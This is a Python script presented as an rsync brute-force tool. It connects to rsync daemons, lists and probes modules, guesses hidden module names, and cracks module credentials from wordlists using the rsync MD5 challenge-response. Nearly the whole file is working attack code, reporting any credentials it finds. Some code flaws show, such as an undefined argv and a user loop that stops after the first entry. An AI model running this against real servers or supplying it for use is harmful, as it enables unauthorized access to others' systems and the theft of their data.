#!/usr/bin/python

import sys
import socket
import base64
import hashlib
import argparse

""" 
    Rsync Bruteforce v0.1 - Created by BrunoRR
    
    * Accepts IPv4/IPv6 address 
    * Was partialy based on: https://github.com/nixawk/hello-python2/blob/master/socket/socket-rsync.py

    Usage example:
        - List Modules: python3 rsyncBF.py <host>
        - Module Discover: python3 rsyncBF.py <-m/-mf> <module name/file> <host>
        - Module Access BF: python3 rsyncBF.py <-m/-mf> <module name/file> <-u/uf> <username/file> <-p/-pf> <password/file> <host>

"""

RSYNC_HEADER = '@RSYNCD:'
SOCKET_TIMEOUT = 10
RECV_BUFFER = 1024



class Args(object):
    def __init__(self):
        self.parser = argparse.ArgumentParser()

    def parser_error(self, errmsg):
        print("Usage: python3 " + argv[0] + " use -h for help")
        exit("Error: {}".format(errmsg))

    def parse_args(self):
        self.parser._optionals.title = "OPTIONS"
        self.parser.add_argument('host', help = 'IPv4/IPv6 address of the rsync server')
        self.parser.add_argument('--port','-P', help = "Rsync Server Port", default = 873, type = int)
        self.parser.add_argument('--username','-u', help = 'Module username', default = None)
        self.parser.add_argument('--password','-p', help = 'Module password', default = None)
        self.parser.add_argument('--module','-m', help = 'Specific module to bruteforce access', default = None)
        self.parser.add_argument('--ufile','-uf', dest = 'userfile', help = 'Wordlist to bruteforce module username', default = None)
        self.parser.add_argument('--pfile','-pf', dest = 'passfile', help = 'Wordlist to bruteforce module password', default = None)
        self.parser.add_argument('--mfile','-mf', dest = 'modfile', help = 'Wordlist to bruteforce possible hidden modules', default = None)

        return self.parser.parse_args()

class RsyncBF():
    def __init__(self, host, port, username, password, module, userFile, passFile, moduleFile):
        self.host = host
        self.port = port
        self.username = username
        self.userFile = userFile
        self.password = password
        self.passFile = passFile
        self.module = module
        self.moduleFile = moduleFile

        self.modules_list = []
        self.modules_names = []

        self.start()


    def connect(self):

        for res in socket.getaddrinfo(self.host, self.port, socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res

            try:
                self.rsync_socket = socket.socket(af, socktype, proto)
                self.rsync_socket.settimeout(SOCKET_TIMEOUT)
                self.rsync_socket.connect(sa)
            except socket.error as msg:
                print('\n\n[!] Connection error: {}\n'.format(str(msg)) )
                exit(1)

    def disconnect(self):
        self.rsync_socket.close()

    def send(self, data):
        self.rsync_socket.sendall( str.encode(data) )

    def read(self):
        return self.rsync_socket.recv( RECV_BUFFER )


    def negotiate(self):
        RSYNC_VERSION = self.rsync_socket.recv(RECV_BUFFER).decode()
        RSYNC_VERSION = RSYNC_VERSION.split('\n')[0].split(' ')[1]

        self.rsync_socket.sendall( str.encode('{} {}\n'.format(RSYNC_HEADER, RSYNC_VERSION)) )

    def get_ChallengeResponse(self, challenge, password):
        challenge = challenge.split('\n')[0].split(' ')[2]

        md5 = hashlib.md5()
        md5.update( password.encode("UTF8").rstrip() )
        md5.update( challenge.encode("UTF8") )
        md5.digest()

        pwdHash = base64.b64encode( md5.digest() )
        pwdHash = pwdHash.decode().rstrip('==')

        return pwdHash

    def startConnection(self):
        self.connect()
        self.negotiate()

        self.motd = self.read()
        #print( self.motd.decode('UTF8') )


    def get_public_modules(self):

        self.send('\n')
        raw = self.read()

        lines = str(raw.decode('UTF8')).split("\n")

        for line in lines:
            if not (line and "\t" in line): continue

            name, comment = line.split("\t", 1)
            name = name.strip('\n\r\t ')
            module_info = { "name": name, "comment": comment }

            self.modules_list.append( module_info )
            self.modules_names.append( name )

        self.disconnect()
        self.check_public_modules_access()

    def check_public_modules_access(self):

        for module in self.modules_list:
            self.startConnection()
            self.send( module["name"] + '\n')
            
            raw = self.read().decode()
            self.disconnect()

            if '@RSYNCD: OK' in raw:
                module["comment"] = module["comment"] + '\t<Ok>'
            elif '@RSYNCD: AUTHREQD' in raw:
                module["comment"] = module["comment"] + '\t<Password Protected>'
            elif 'access denied' in raw:
                module["comment"] = module["comment"] + '\t<Access Denied>'
            else:
                module["comment"] = module["comment"] + '\t<Unknown>'

            print(" {}\t\t{}".format(module['name'], module['comment']))

        print('')


    def iterate_Modules(self):
        mod = [self.module] if self.module else open(self.moduleFile)

        for m in mod:
            print('   [+] Bruteforcing access to module: {}\t'.format(m.strip('\n\r\t ')), end = '', flush = True)

            self.iterate_Users(m);

        print('\n')

    def iterate_Users(self, _module):
        usr = [self.username] if self.username else open(self.userFile, 'r')
        
        stop = False
        while stop == False:
            for u in usr:

                if not self.iterate_Passwords(u, _module): print('[AUTH FAILED]')
                stop = True
                break

    def iterate_Passwords(self, _user, _module):
        pwd = [self.password] if self.password else open(self.passFile, 'r')
        
        _user = _user.strip('\n\r\t ')
        _module = _module.strip('\n\r\t ')


        for p in pwd:
            p = p.strip('\n\r\t ')            

            try: 
                self.startConnection()
                self.send( '{}\n'.format(_module) );

                raw = self.read().decode()
            except socket.timeout:
                continue
            

            if '@RSYNCD: OK' in raw:
                print('[OK]')
                
                self.disconnect()
                return True

            elif 'Unknown module' in raw:
                print('[UNKNOWN MODULE]')

                self.disconnect()
                return True

            elif 'AUTHREQD' in raw:
                self.send( '{} {}\n'.format(_user, self.get_ChallengeResponse(raw, p)) )
                authRaw = self.read().decode()
                #print (authRaw)

                if '@RSYNCD: OK' in authRaw:
                    print('[CREDENTIAL FOUND]    {} : {}'.format(_user, p) )

                    self.disconnect()
                    return True

            else:
                print('[ERROR]')
                #print('     \__ Server returned: ' + raw)
                self.disconnect()
                return True


        return False


    def bruteAccess(self):
        self.iterate_Modules();

    def bruteModule(self):
        mod = [self.module] if self.module else open(self.moduleFile)

        for m in mod:
            self.startConnection()
            self.send('{}\n'.format(m.strip('\n\r\t ')) )

            raw = self.read().decode()
            #print(raw)

            if 'Unknown module' not in raw:
                print('   [+] Module found: {}'.format(m.strip('\n\r\t ')) )

            self.disconnect()
        print('')


    def start(self):
        print('\n\t\t[ RSYNC Bruteforce v0.1 ]\n\n')


        if not self.module and not self.moduleFile:
            self.startConnection()
            print('[!] Connected to ' + self.host)

            print('[*] Retrieving public modules...')
            self.get_public_modules()            

        else:
            if (not self.username and not self.userFile) or (not self.password and not self.passFile):
                print('[!] Module discover started...\n')
                self.bruteModule()

            else:
                print('[!] Module access bruteforce started...\n')
                self.bruteAccess()


if __name__ == "__main__":
    args = Args().parse_args()

    RsyncBF( host = args.host, port = args.port, 
        username = args.username, userFile = args.userfile, 
        password = args.password, passFile = args.passfile, 
        module = args.module, moduleFile = args.modfile )